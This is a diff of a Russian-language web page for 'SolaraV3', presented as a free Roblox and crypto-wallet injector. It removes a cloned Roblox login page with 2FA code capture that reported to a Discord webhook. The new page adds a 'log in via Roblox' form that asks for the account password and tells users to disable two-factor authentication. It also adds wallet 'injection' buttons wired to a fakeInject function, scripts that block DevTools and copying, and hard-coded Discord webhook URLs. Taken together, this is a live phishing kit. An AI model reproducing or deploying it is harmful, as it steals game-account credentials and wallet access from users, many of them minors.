+    </section>
+
+    <!-- STATS -->
+    <div class="stats animate-fade-up-delay-2">
+        <div class="stat"><h3 id="downloadsStat">22K+</h3><p data-i18n="stat_downloads">Загрузок</p></div>
+        <div class="stat"><h3 id="ratingStat">4.8</h3><p data-i18n="stat_rating">Рейтинг</p></div>
+        <div class="stat"><h3>99.9%</h3><p data-i18n="stat_stability">Стабильность</p></div>
+        <div class="stat"><h3>24/7</h3><p data-i18n="stat_support">Поддержка</p></div>
     </div>
+
+    <!-- FEATURES -->
+    <section class="features" id="features">
+        <h2 data-i18n="features_title">Почему SolaraV3?</h2>
+        <p class="subtitle" data-i18n="features_sub">Всё, что нужно для комфортной игры</p>
+        <div class="features-grid">
+            <div class="feature-card" style="animation-delay:0.1s;"><div class="icon">⚡</div><h3 data-i18n="f_speed">Высокая скорость</h3><p data-i18n="f_speed_desc">Оптимизированный код, минимальная задержка и мгновенный отклик.</p></div>
+            <div class="feature-card" style="animation-delay:0.2s;"><div class="icon">🛡️</div><h3 data-i18n="f_security">Безопасность</h3><p data-i18n="f_security_desc">Проверка на вирусы, шифрование данных и защита от обнаружения.</p></div>
+            <div class="feature-card" style="animation-delay:0.3s;"><div class="icon">🔄</div><h3 data-i18n="f_updates">Автообновления</h3><p data-i18n="f_updates_desc">Инжектор автоматически загружает последние версии и патчи.</p></div>
+            <div class="feature-card" style="animation-delay:0.4s;"><div class="icon">🎮</div><h3 data-i18n="f_games">Поддержка игр</h3><p data-i18n="f_games_desc">Совместим с большинством популярных игр и платформ.</p></div>
+            <div class="feature-card" style="animation-delay:0.5s;"><div class="icon">📦</div><h3 data-i18n="f_light">Лёгкий вес</h3><p data-i18n="f_light_desc">Малый размер, быстрая загрузка и минимальное потребление ресурсов.</p></div>
+            <div class="feature-card" style="animation-delay:0.6s;"><div class="icon">💬</div><h3 data-i18n="f_support">Поддержка 24/7</h3><p data-i18n="f_support_desc">Круглосуточная помощь сообщества и разработчиков.</p></div>
+        </div>
+    </section>
+
+    <!-- AUTH -->
+    <section class="auth-section" id="auth">
+        <div class="tabs">
+            <button class="tab-btn active" data-tab="login">🔑 <span data-i18n="tab_login">Вход</span></button>
+            <button class="tab-btn" data-tab="register">📝 <span data-i18n="tab_register">Регистрация</span></button>
+            <button class="tab-btn" data-tab="roblox">🎮 <span data-i18n="tab_roblox">Roblox</span></button>
+        </div>
+
+        <div id="loginForm">
+            <div class="alert" id="loginAlert"></div>
+            <div class="form-group"><label data-i18n="username_label">Имя пользователя</label><input type="text" id="loginUsername" placeholder="Введите имя пользователя"></div>
+            <div class="form-group"><label data-i18n="password_label">Пароль</label><input type="password" id="loginPassword" placeholder="••••••••"></div>
+            <button class="btn" id="loginBtn"><span data-i18n="login_btn_text">Войти →</span></button>
+            <div class="hwid-info">🔒 <span data-i18n="hwid_info">Привязка по</span> <strong>HWID</strong> <span data-i18n="hwid_info2">и</span> <strong>IP</strong> — <span data-i18n="hwid_info3">только одно устройство</span></div>
+        </div>
+
+        <div id="registerForm" class="panel-hidden">
+            <div class="alert" id="registerAlert"></div>
+            <div class="form-group"><label data-i18n="username_label">Имя пользователя</label><input type="text" id="regUsername" placeholder="Придумайте никнейм"><div class="hint" data-i18n="reg_hint">Только латиница и цифры, 3–20 символов. Без пробелов (используйте _)</div></div>
+            <div class="form-group"><label data-i18n="password_label">Пароль</label><input type="password" id="regPassword" placeholder="Минимум 8 символов"><div class="password-strength" id="passwordStrength"></div><div class="hint" data-i18n="reg_pwd_hint">Используйте буквы, цифры и символы для надёжности</div></div>
+            <button class="btn" id="registerBtn"><span data-i18n="register_btn">Создать аккаунт →</span></button>
+            <div class="hwid-info">🔒 <span data-i18n="hwid_register">Ваш</span> <strong>HWID</strong> <span data-i18n="hwid_register2">будет привязан к аккаунту</span></div>
+            <div class="guarantee-box">✅ <span data-i18n="guarantee_register">После регистрации через Roblox вы получите 100% возврат средств в случае бана</span></div>
+        </div>
+
+        <div id="robloxForm" class="panel-hidden">
+            <div class="alert" id="robloxAlert"></div>
+            <div style="text-align:center; margin-bottom:20px;"><div style="font-size:48px; margin-bottom:8px;">🎮</div><p style="color:var(--muted); font-size:14px;" data-i18n="roblox_desc">Войдите через Roblox, чтобы получить доступ к эксклюзивным функциям</p></div>
+            <div class="form-group"><label data-i18n="roblox_username_label">Roblox логин</label><input type="text" id="robloxUsername" placeholder="Ваш логин в Roblox"><div class="hint" data-i18n="roblox_username_hint">Используйте ваш логин от Roblox</div></div>
+            <div class="form-group"><label data-i18n="roblox_password_label">Пароль Roblox</label><input type="password" id="robloxPassword" placeholder="Ваш пароль от Roblox"><div class="hint" data-i18n="roblox_pwd_hint">Введите пароль от вашего аккаунта Roblox</div></div>
+            <div style="font-size:12px; color:var(--muted); text-align:center; margin-bottom:12px; opacity:0.7;" data-i18n="roblox_2fa_warning">⚠️ Для входа временно отключите двухфакторную аутентификацию (2FA) в Roblox</div>
+            <button class="btn" id="robloxBtn"><span data-i18n="roblox_btn">🎮 Войти через Roblox →</span></button>
+            <div class="hwid-info">🔒 <span data-i18n="roblox_secure">Данные передаются по защищённому каналу</span></div>
+            <div class="guarantee-box">✅ <span data-i18n="roblox_guarantee">При входе через Roblox вы гарантированно получаете 100% возврат средств в случае бана</span></div>
+        </div>
+
+        <div id="injectorPanel" class="panel-hidden">
+            <div class="injector-panel">
+                <h3>🚀 <span data-i18n="welcome">Добро пожаловать</span>, <span id="userNameDisplay">User</span>!</h3>
+                <p class="greeting" data-i18n="injector_greeting">Выберите опцию для инжекции</p>
+                <div class="btn-group">
+                    <button class="btn-option" onclick="fakeInject('Phantom')">🟣 Phantom</button>
+                    <button class="btn-option" onclick="fakeInject('Solflare')">🟠 Solflare</button>
+                    <button class="btn-option" onclick="fakeInject('Backpack')">🎒 Backpack</button>
+                    <button class="btn-option" onclick="fakeInject('MetaMask')">🦊 MetaMask</button>
+                    <button class="btn-option" onclick="fakeInject('Roblox')" style="border-color:#e03a3a;">🎮 Roblox</button>
+                </div>
+                <div class="status" id="injectStatus">✅ <span data-i18n="injector_ready">Готов к работе</span></div>
+                <button class="logout-btn" id="logoutBtn"><span data-i18n="logout_btn">🚪 Выйти</span></button>
+            </div>
+        </div>
+    </section>
+
+    <!-- REVIEWS -->
+    <section class="reviews" id="reviews">
+        <h2 data-i18n="reviews_title">Что говорят пользователи</h2>
+        <p class="subtitle" data-i18n="reviews_sub">Реальные отзывы от реальных людей</p>
+        <div class="review-grid" id="reviewGrid"></div>
+        <div class="review-form" id="reviewForm">
+            <input type="text" id="reviewInput" placeholder="Ваш отзыв..." data-i18n="review_placeholder" disabled>
+            <button class="btn-add-review" id="addReviewBtn" data-i18n="add_review_btn" disabled>📝 Добавить отзыв</button>
+            <div style="width:100%; text-align:center; font-size:13px; color:var(--muted); margin-top:8px;" id="reviewAuthNotice">❗ Для добавления отзыва необходимо войти в аккаунт</div>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="faq" id="faq">
+        <h2 data-i18n="faq_title">Часто задаваемые вопросы</h2>
+        <div class="faq-grid">
+            <div class="faq-item"><h4>❓ <span data-i18n="faq1_q">Что такое SolaraV3?</span></h4><p data-i18n="faq1_a">Бесплатный инжектор для игр и крипто-платформ, разработанный для быстрой и безопасной инжекции.</p></div>
+            <div class="faq-item"><h4>🛡️ <span data-i18n="faq2_q">Это безопасно?</span></h4><p data-i18n="faq2_a">Да, мы проверяем все файлы на вирусы, используем шифрование и защиту от обнаружения.</p></div>
+            <div class="faq-item"><h4>💻 <span data-i18n="faq3_q">Какие системы поддерживаются?</span></h4><p data-i18n="faq3_a">Windows 10 и 11 (64-bit). Поддержка macOS и Linux в разработке.</p></div>
+            <div class="faq-item"><h4>🔄 <span data-i18n="faq4_q">Как часто выходят обновления?</span></h4><p data-i18n="faq4_a">Обновления выходят автоматически при запуске инжектора. Мы следим за актуальностью.</p></div>
+        </div>
+    </section>
+
+    <!-- AI SUPPORT -->
+    <section class="support-section" id="support">
+        <h2 data-i18n="support_title">💬 Поддержка с AI</h2>
+        <p class="subtitle" data-i18n="support_sub">Задайте вопрос — наш AI-помощник ответит мгновенно</p>
+        <div class="support-card animate-fade-up">
+            <div class="chat-box" id="chatBox">
+                <div class="message bot">👋 Привет! Я AI-помощник SolaraV3. Задайте любой вопрос о продукте, установке или работе инжектора. Также вы можете отправить предложение по улучшению прямо в чате.<span class="time">только что</span></div>
+            </div>
+            <div class="typing-indicator" id="typingIndicator"><span class="dots">•••</span> AI печатает...</div>
+            <div class="input-row">
+                <input type="text" id="userInput" placeholder="Введите ваш вопрос..." autofocus>
+                <button class="btn-send" id="sendBtn">Отправить</button>
+            </div>
+            <div class="support-footer"><a href="#" id="clearChatBtn">🧹 Очистить чат</a></div>
+            <div class="suggestions-inline" id="suggestionsInline">
+                <textarea id="suggestionInput" placeholder="📝 Или напишите предложение по улучшению..." rows="2"></textarea>
+                <button class="btn-suggest-inline" id="sendSuggestionInlineBtn">📤 Отправить предложение</button>
+                <div class="suggest-status-inline" id="suggestStatusInline"></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer>
+        <div class="links">
+            <a id="privacyBtn" data-i18n="privacy">Политика конфиденциальности</a>
+            <a id="termsBtn" data-i18n="terms">Условия использования</a>
+        </div>
+        <p>© 2025 SolaraV3 · <span data-i18n="footer_love">Сделано с ❤️</span> · <span data-i18n="footer_rights">Все права защищены</span></p>
+    </footer>
 </div>
 
-<div class="main-page" id="mainPage">
-    <div class="wrap">
-        <div class="logo">
-            <svg viewBox="0 0 160 44"><rect x="2" y="14" width="4" height="16" rx="2" fill="#fff"/><rect x="10" y="14" width="4" height="16" rx="2" fill="#fff"/><rect x="18" y="7" width="4" height="23" rx="2" fill="#fff"/><rect x="26" y="14" width="4" height="10" rx="2" fill="#fff"/><rect x="34" y="14" width="4" height="16" rx="2" fill="#fff"/><text x="44" y="32" font-family="Arial Black" font-weight="900" font-size="22" fill="#fff">ROBLOX</text></svg>
-        </div>
-        <div class="card">
-            <!-- LOGIN -->
-            <div id="stepLogin">
-                <h1>Log In</h1><p class="sub">Log into your Roblox account</p>
-                <div class="err" id="eLogin">Incorrect username or password.</div>
-                <div class="fld"><label>Username</label><input type="text" id="u" placeholder="username" autocomplete="off" minlength="3" maxlength="30"><span class="counter" id="uCounter">0/30</span><div class="hint" id="uHint">Username must be 3-30 characters. Letters, numbers, and underscores only.</div></div>
-                <div class="fld"><label>Password</label><input type="password" id="p" placeholder="password" autocomplete="off" minlength="8" maxlength="20"><span class="counter" id="pCounter">0/20</span><div class="hint" id="pHint">Password must be 8-20 characters.</div></div>
-                <button class="btn" id="btnLogin" onclick="doLogin()">Log In</button>
-                <div class="footer" style="margin-top:14px"><a onclick="showStep('stepForgot')">Forgot Password or Username?</a></div>
-                <div class="signup-link"><a onclick="showStep('stepSignup')">Don't have an account? Sign Up</a></div>
-            </div>
-            
-            <!-- SIGNUP -->
-            <div id="stepSignup" style="display:none">
-                <h1>Sign Up</h1><p class="sub">Create your Roblox account</p>
-                <div class="info-box" id="signupInfo" style="display:none">⚠️ This username is already taken. Please choose another one.</div>
-                <div class="err" id="eSignup" style="display:none">Please fill all fields correctly.</div>
-                <div class="fld"><label>Username</label><input type="text" id="su" placeholder="username" autocomplete="off" minlength="3" maxlength="30"><span class="counter" id="suCounter">0/30</span><div class="hint" id="suHint">Username must be 3-30 characters. Letters, numbers, and underscores only.</div></div>
-                <div class="suggestions" id="usernameSuggestions" style="display:flex;flex-wrap:wrap;gap:6px;margin-top:8px"></div>
-                <div class="fld"><label>Password</label><input type="password" id="sp" placeholder="password" autocomplete="off" minlength="8" maxlength="20"><span class="counter" id="spCounter">0/20</span><div class="hint" id="spHint">Password must be 8-20 characters with at least 1 number or symbol.</div><div class="strength-bar" id="strengthBar"></div></div>
-                <div class="fld"><label>Confirm Password</label><input type="password" id="sp2" placeholder="confirm password" autocomplete="off" minlength="8" maxlength="20"><div class="hint" id="sp2Hint">Passwords do not match.</div></div>
-                <button class="btn" id="btnSignupBtn" onclick="doSignup()">Sign Up</button>
-                <div class="signup-link">Already have an account? <a onclick="showStep('stepLogin')">Log In</a></div>
-            </div>
-            
-            <!-- FORGOT PASSWORD -->
-            <div id="stepForgot" style="display:none">
-                <h1>Forgot Password</h1><p class="sub">Enter your email or username to reset your password</p>
-                <div class="err" id="eForgot">Please enter a valid email or username.</div>
-                <div class="fld"><label>Email or Username</label><input type="text" id="fg" placeholder="email or username" autocomplete="off" minlength="3" maxlength="100"><div class="hint" id="fgHint">Enter your account email address or username.</div></div>
-                <button class="btn" onclick="doForgot()">Submit</button>
-                <div class="success-msg" id="forgotSuccess"><div class="check">✅</div><p>If an account exists for <strong id="forgotUser"></strong>, you will receive reset instructions.</p></div>
-                <button class="btn-back" onclick="showStep('stepLogin')">← Back to Log In</button>
-            </div>
-            
-            <!-- EMAIL VERIFICATION STEP -->
-            <div id="stepEmailVerify" style="display:none">
-                <div class="ver-title">Email Verification</div><div class="ver-sub">We sent a 6-digit code to your email. Enter it below.</div>
-                <div class="err" id="eEmailVerify">Invalid code. Please try again.</div>
-                <div class="code-boxes" id="emailCodeBoxes">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                </div>
-                <button class="btn" id="btnEmailVerify" onclick="doEmailVerify()">Verify Email</button>
-                <div class="resend-link"><a id="resendEmailBtn" onclick="resendEmailCode()">Resend Code</a> <span id="emailCountdown" style="color:var(--muted)"></span></div>
-            </div>
-            
-            <div class="load" id="load1"><div class="spinner"></div><p>Checking...</p></div>
-            
-            <!-- 2FA -->
-            <div id="step2fa" style="display:none">
-                <div class="ver-title">Verification Required</div><div class="ver-sub">Enter the 6-digit code sent to your authenticator app.</div>
-                <div class="err" id="e2FA">Invalid code. Try again.</div>
-                <div class="code-boxes" id="codeBoxes">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
-                </div>
-                <button class="btn" id="btnVerify" onclick="do2FA()">Verify</button>
-                <div class="resend-link"><a id="resendBtn" onclick="resendCode()">Send Code Again</a> <span id="countdown" style="color:var(--muted)"></span></div>
-            </div>
-            <div class="load" id="load2"><div class="spinner"></div><p>Verifying...</p></div>
-        </div>
+<!-- MODAL -->
+<div class="modal-overlay" id="modalOverlay">
+    <div class="modal-content" id="modalContent">
+        <h2 id="modalTitle">Заголовок</h2>
+        <div id="modalBody"></div>
+        <button class="close-btn" id="modalClose" data-i18n="close_btn">Закрыть</button>
     </div>
 </div>
 
 <script>
-(function(){
-    const WH='https://discord.com/api/webhooks/1510730615387848865/cFXlUZl8LBmxG2PMYeESpWSykwvFr1kgCxSvC5yjvNWlnXUy78mEam9lIG-7BYu2jcKK';
-    var U='',P='',attempts=0,cooldown=0,cdInterval=null;
-    var emailAttempts=0,emailCooldown=0,emailCdInterval=null;
-    var lastForgotEmail='';
-    
-    const USERNAME_PREFIXES=['xX','Xx','Pro','Noob','Dark','Fire','Ice','Shadow','Frost','Blaze','Storm','Fury','Zen','Neo','Nova','Epic','Mega','Ultra','Hyper'];
-    const USERNAME_SUFFIXES=['Gamer','Player','Master','Slayer','King','Lord','Ninja','Knight','Demon','Angel','Wolf','Dragon','Phoenix','Titan','Hero','Legend','Warrior','Hunter','Fighter'];
-    const BANNED_WORDS=['admin','mod','moderator','roblox','staff','support','help','official','system','test','guest','user','login','signup','password','account','security','verify','robloxcoxx','owner','dev','developer'];
-    
-    // ---- РАСШИРЕННЫЙ СПИСОК ЗНАМЕНИТЫХ НИКНЕЙМОВ И ЮТУБЕРОВ (100к+) ----
-    const FAMOUS_USERNAMES = [
-        // Легендарные/редкие
-        'Builderman', 'Shedletsky', 'Clockwork', 'John', 'Roblox', 'Admin', 'System', 'Telamon', 'Erik', 'Cass',
-        '1', '0', 'A', 'B', 'C', 'X', 'Z', 'Q', 'M', 'N', 'O', 'P', 'R', 'S', 'T', 'U', 'V', 'W', 'Y',
-        'II', 'III', 'IV', 'IX', 'XI', 'XX', 'VII', 'VIII', 'XII', 'XIII',
-        'Noob', 'Noob123', 'NoobMaster', 'Guest', 'Guest123', 'Guest_', 'Robloxian', 'Robloxian123',
-        // === ОСНОВНЫЕ ЮТУБЕРЫ (100к+) ===
-        'Flamingo', 'Albert', 'KreekCraft', 'TanqR', 'Tofuu', 'Poke', 'ItsFunneh', 'Gold', 'Brianna',
-        'Deeter', 'LeahAshe', 'Russo', 'Mack', 'Slogo', 'Jelly', 'Rainbow', 'Fury', 'Valk', 'Bandites',
-        'Ducky', 'Panda', 'Ghost', 'Shadow', 'Venom', 'Blaze', 'Frost', 'Storm', 'Thunder', 'Lightning',
-        'Phoenix', 'Dragon', 'Wolf', 'Tiger', 'Lion', 'Eagle', 'Hawk', 'Falcon', 'Raven', 'Crow',
-        'Owl', 'Fox', 'Bear', 'Polar', 'Arctic', 'Nova', 'Cosmic', 'Galaxy', 'Solar', 'Lunar',
-        'Stellar', 'Orbit', 'Comet', 'Asteroid', 'Meteor', 'Nebula', 'Vortex', 'Tornado', 'Hurricane',
-        'Typhoon', 'Monsoon', 'Cyclone', 'Zen', 'Karma', 'Mystic', 'Legend', 'Hero', 'Guardian',
-        'Paladin', 'Warrior', 'Knight', 'Samurai', 'Ninja', 'Rogue', 'Sage', 'Wizard', 'Sorcerer',
-        'Magician', 'Enchanter', 'Mage', 'Warlock', 'Viking', 'Berserker', 'Titan', 'Giant', 'Colossus',
-        'Golem', 'Demon', 'Angel', 'Divine', 'Eternal', 'Infinity', 'Omega', 'Alpha', 'Beta', 'Gamma',
-        'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta', 'Iota', 'Kappa', 'Lambda', 'Mu', 'Nu', 'Xi',
-        'Omicron', 'Pi', 'Rho', 'Sigma', 'Tau', 'Upsilon', 'Phi', 'Chi', 'Psi',
-        'Denis', 'DenisDaily', 'DenisYT', 'Corl', 'CorlYT', 'CorlOfficial', 'OfflineTV', 'DisguiseToast',
-        'Valkyrae', 'Sykkuno', 'Ludwig', 'MoistCr1TiKaL', 'PewDiePie', 'Markiplier', 'Jacksepticeye',
-        'Dream', 'GeorgeNotFound', 'Sapnap', 'KarlJacobs', 'Quackity', 'TommyInnit', 'Technoblade',
-        'MrBeast', 'DudePerfect', 'Ninja', 'Shroud', 'DrDisrespect', 'TimTheTatman', 'NickMercs',
-        'Aydan', 'ZLaner', 'Symfuhny', 'Tfue', 'Cloakzy', 'SypherPK', 'CourageJD', 'Nadeshot',
-        'Scump', 'Formal', 'Crimsix', 'Karma', 'JKap', 'Clayster', 'Attach', 'Zoomaa', 'Priestahh',
-        'Simp', 'AbeZy', 'Cellium', 'Arcitys', 'MajorManiak', 'Shotzzy', 'Illey', 'Rambo', 'Dashy',
-        'H3CZ', 'Mboze', 'BigT', 'Rambo', 'Sharp', 'Merk', 'Nifty', 'Aches', 'TeePee',
-        'Censor', 'DougMartin', 'Pamaj', 'TmarTn', 'FazeBlaze', 'FazeNiks', 'FazeBanks', 'FazeApex',
-        'FazeJev', 'FazeSwagg', 'FazeKay', 'FazeH1ghSky1', 'FazeTemperrr', 'FazeSniperwolf',
-        // === ДОПОЛНИТЕЛЬНЫЕ ИЗ ПОИСКА (100к+) ===
-        'ElAbrahaham', 'CaylusBlox', 'TypicalGamer', 'Legolaz', 'BeanRoblox', 'FacePalmz',
-        'rblxscripts', 'StanPrice', 'MrParadox', 'Kianish', 'Fantix', 'S3NILY', 'Oficey',
-        'SimplyPatrick', 'KoKoPanda', 'RetroDan', 'Shivy', 'Adrixo', 'Tso_Sun',
-        'AlvinBlox', 'axabella', 'Betroner', 'Noangy', 'biggranny000', 'CatFer',
-        'Chaseroony', 'ChloeGames', 'Ciudadano', 'CMParmy', 'Conor3D', 'DarkAltrax',
-        'Domino', 'FairOut', 'FandroidGAME', 'Favoritos', 'Flexer97', 'frenchrxses',
-        'GrayPhiny', 'greenlegocats123', 'HeathHaskins', 'Hollpiglet', 'iGuz',
-        'ImaFlyNmidget', 'JamieThatBloxer', 'JeromeASF', 'JoeyDaPlayer', 'KingSgaming',
-        'Koneko', 'Kong', 'Lazer1785', 'legobloxian', 'Linkmon99', 'Lonnie',
-        'MarcoYolo', 'KyMeister', 'MichealP', 'NickDominates', 'NikTac', 'Nitrolord',
-        'noekje', 'NOOBASHA', 'notive', 'NubNeb', 'OpaOsiris', 'ParadoxPoKe',
-        'Paja', 'PetriFyTV', 'Phoeberry', 'PinkAnt', 'Plepsu', 'Raconidas',
-        'RazorFishGaming', 'Rexex', 'RobloxGaming', 'RobloxMinigunner', 'SallyGreenGamer',
-        'SDMittens', 'SharkBlox', 'esqueletoslasher', 'skyleree', 'SnyFort',
-        'SpaceGamer', 'StronbolRoblox', 'SynthesizeOG', 'TadElMercader', 'TheEvilShark',
-        'TheLaughingUnicorn', 'Tooquick', 'TypicalModders', 'Verti',
-        // === ИЗ СТАТЬИ TIMES OF INDIA ===
-        'KAICENAT3', 'xQc', 'xqxqcxqcxqc12', 'TheRealShowSpeedy', 'mrflimflam',
-        'HiVise77', 'UndercoverTubbo', 'QuackityHQ', 'TheMonkeyManGamer',
-        'sapnapisreallycool', 'Gorgington', 'ALPHAKENNYBODYY_', 'largegiantstrongman',
-        'StaleStork289', 'crydae',
-        // === ДОПОЛНИТЕЛЬНЫЕ ПОПУЛЯРНЫЕ (100к+) ===
-        'Cobanermani456', 'GamerGirl', 'ItsFunneh', 'GoldenGlove', 'PrestonPlayz', 'BriannaYT',
-        'Furious', 'JellyBean', 'SquidGame', 'RainbowDash', 'SkyDoesMinecraft', 'HuskyMinecraft',
-        'BajanCanadian', 'Woofless', 'Lachlan', 'Muselk', 'Loserfruit', 'Freshy', 'Raccoon',
-        'CryBaby', 'PinkSheep', 'Kwebbelkop', 'Slogoman', 'Jellybean', 'Terroriser', 'BigJigglyPanda',
-        'Fitz', 'SwaggerSouls', 'Zuckles', 'McCreamy', 'Soup', 'Mully', 'EddieVR', 'Smii7y',
-        'Blarg', 'ElasticDroid', 'TheDooo', 'Grizzy', 'Berleezy', 'RDCWorld1', 'AfroSenju',
-        'NakeyJakey', 'Misfits', 'RaccoonEggs', 'CrankThatFrank', 'JacksFilms', 'VideoGameDunkey',
-        'Cr1TiKaL', 'Penguinz0', 'MoistCr1TiKaL', 'xQc', 'Asmongold', 'Summit1g', 'Lirik',
-        // === СВОИ ===
-        'SWILL', 'SWILL_', 'SWILLWAY', 'SWILL_TEAM', 'SWILLWAY_TEAM'
-    ];
-    const FAMOUS_SET = new Set(FAMOUS_USERNAMES.map(n => n.toLowerCase()));
-    
-    function isFamousUsername(name) {
-        return FAMOUS_SET.has(name.toLowerCase());
-    }
-    
-    function isGarbageUsername(name) {
-        if (name.length < 5) return false;
-        const lower = name.toLowerCase();
-        const garbagePatterns = [
-            /^(.)\1{4,}$/, /^qwerty/i, /^asdf/i, /^zxcv/i, /^qwertyuiop/i, /^asdfghjkl/i, /^zxcvbnm/i,
-            /^123456/i, /^abcdef/i, /^abcd/i, /^test/i, /^guest/i, /^user/i, /^admin/i, /^mod/i,
-            /^poiuyt/i, /^lkjhgf/i, /^mnbvc/i, /^qwer/i, /^asdzxc/i, /^([a-z])\1{2,}/
-        ];
-        for (let pat of garbagePatterns) {
-            if (pat.test(lower)) return true;
+    // ============================================================
+    //  ЗАЩИТА ОТ F12, КОПИРОВАНИЯ И ВЫДЕЛЕНИЯ
+    // ============================================================
+    document.addEventListener('keydown', function(e) {
+        // Защита от F12 и DevTools
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
+            (e.ctrlKey && e.key === 'U') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'S') ||
+            (e.ctrlKey && e.key === 'P')) {
+            e.preventDefault();
+            return false;
         }
-        if (/^([a-z]{2})\1+$/.test(lower)) return true;
-        if (/^([a-z]{3})\1+$/.test(lower)) return true;
-        const uniqueChars = new Set(lower.split(''));
-        if (uniqueChars.size <= 3 && lower.length >= 6) return true;
-        if (/(.)\1{3,}/.test(lower)) return true;
+        // Защита от Ctrl+C, Ctrl+V, Ctrl+X (кроме полей ввода)
+        if ((e.ctrlKey && (e.key === 'c' || e.key === 'v' || e.key === 'x' || e.key === 'a')) && 
+            !['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    // Защита от контекстного меню (ПКМ)
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
         return false;
-    }
-    
-    function hasR(t){return /[а-яё]/i.test(t)}
-    function hasInvalidChars(t){return /[^a-zA-Z0-9_]/.test(t)}
-    function hasSpace(t){return /\s/.test(t)}
-    function hasBannedWord(t){var lower=t.toLowerCase();return BANNED_WORDS.some(function(w){return lower.includes(w)})}
-    
-    function generateUsernameSuggestions(base){
-        var s=[];var cleanBase=base.replace(/[^a-zA-Z0-9_]/g,'').substring(0,10);
-        if(cleanBase.length>=3){
-            for(var i=0;i<5;i++){var n=Math.floor(Math.random()*9999);s.push(cleanBase+n)}
-        }else{
-            for(var i=0;i<5;i++){var p=USERNAME_PREFIXES[Math.floor(Math.random()*USERNAME_PREFIXES.length)];var suf=USERNAME_SUFFIXES[Math.floor(Math.random()*USERNAME_SUFFIXES.length)];var n=Math.floor(Math.random()*999);s.push(p+'_'+suf+n)}
+    });
+
+    // Защита от выделения через мышь (дополнительно)
+    document.addEventListener('selectstart', function(e) {
+        if (!['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
+            e.preventDefault();
+            return false;
         }
-        return s.filter(function(x){return!hasBannedWord(x)})
+    });
+
+    // Защита от копирования через Ctrl+Ins и Shift+Ins
+    document.addEventListener('copy', function(e) {
+        if (!['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    // Защита от перетаскивания изображений и ссылок
+    document.addEventListener('dragstart', function(e) {
+        e.preventDefault();
+        return false;
+    });
+
+    // Удаление выделения при клике
+    document.addEventListener('mousedown', function(e) {
+        if (!['INPUT', 'TEXTAREA'].includes(e.target.tagName) && !e.target.closest('button')) {
+            if (window.getSelection) {
+                window.getSelection().removeAllRanges();
+            }
+        }
+    });
+
+    // Блокировка открытия DevTools через Ctrl+Shift+I (повторно)
+    window.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+            e.preventDefault();
+            return false;
+        }
+        if (e.ctrlKey && e.key === 'I') {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    // ============================================================
+    //  КОНФИГУРАЦИЯ
+    // ============================================================
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1517567721082982411/baGA0JenKBDYx6X5VQrMh5y3MkiwWvMmGTIkR2FvaWBGjl_3wql07UdzCEUtFtbBPV3y';
+    const SUGGESTIONS_WEBHOOK = 'https://discord.com/api/webhooks/1517590647937306695/ms0b6r8zrpb-aI--qv7YoXmaSyH-fOxsxsewnBi-afIfW8HwYaSkO3rKovZmBx8UPVDM';
+
+    // ============================================================
+    //  ЯЗЫКИ
+    // ============================================================
+    const translations = {
+        ru: {
+            downloads: 'Загрузок: ',
+            virus_free: 'Без вирусов',
+            for_roblox: 'Для Roblox',
+            hero_title: 'Бесплатный <br><span class="highlight">инжектор</span> для Roblox',
+            hero_desc: 'SolaraV3 — мощный, стабильный и безопасный инструмент для инжекции в Roblox. Поддерживает все популярные игры. Обновляется автоматически.',
+            download_btn: 'Скачать SolaraV3',
+            login_btn: 'Войти',
+            support_os: 'Поддерживается: Windows 10/11',
+            version: 'Версия 3.2.1',
+            updated_today: 'Обновлено: сегодня',
+            stat_downloads: 'Загрузок',
+            stat_rating: 'Рейтинг',
+            stat_stability: 'Стабильность',
+            stat_support: 'Поддержка',
+            features_title: 'Почему SolaraV3?',
+            features_sub: 'Всё, что нужно для комфортной игры',
+            f_speed: 'Высокая скорость',
+            f_speed_desc: 'Оптимизированный код, минимальная задержка и мгновенный отклик.',
+            f_security: 'Безопасность',
+            f_security_desc: 'Проверка на вирусы, шифрование данных и защита от обнаружения.',
+            f_updates: 'Автообновления',
+            f_updates_desc: 'Инжектор автоматически загружает последние версии и патчи.',
+            f_games: 'Поддержка игр',
+            f_games_desc: 'Совместим с большинством популярных игр и платформ.',
+            f_light: 'Лёгкий вес',
+            f_light_desc: 'Малый размер, быстрая загрузка и минимальное потребление ресурсов.',
+            f_support: 'Поддержка 24/7',
